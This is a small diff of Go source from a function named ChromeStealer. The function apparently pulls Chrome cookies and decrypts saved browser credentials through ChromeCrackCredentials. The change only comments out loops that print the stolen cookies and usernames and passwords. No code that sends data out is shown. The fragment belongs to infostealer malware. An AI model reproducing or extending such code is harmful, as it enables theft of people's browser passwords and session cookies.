@@ -191,17 +191,17 @@ func ChromeStealer() string {
 	if err != nil {
 		log.Fatal(err)
 	}
-	for _, cookie := range cookies {
-		// fmt.Printf("%s @ %s - %s\n", cookie.Host, cookie.Name, cookie.Value)
-	}
+	// for _, cookie := range cookies {
+	// 	// fmt.Printf("%s @ %s - %s\n", cookie.Host, cookie.Name, cookie.Value)
+	// }
 
 	credentials, err := ChromeCrackCredentials()
 	if err != nil {
 		log.Fatal(err)
 	}
-	for _, cred := range credentials {
-		// fmt.Printf("%s @ %s - %s\n", cred.Host, cred.Username, cred.Password)
-	}
+	// for _, cred := range credentials {
+	// 	fmt.Printf("%s @ %s - %s\n", cred.Host, cred.Username, cred.Password)
+	// }
 
 	// if len(output) != 0 {
 	{
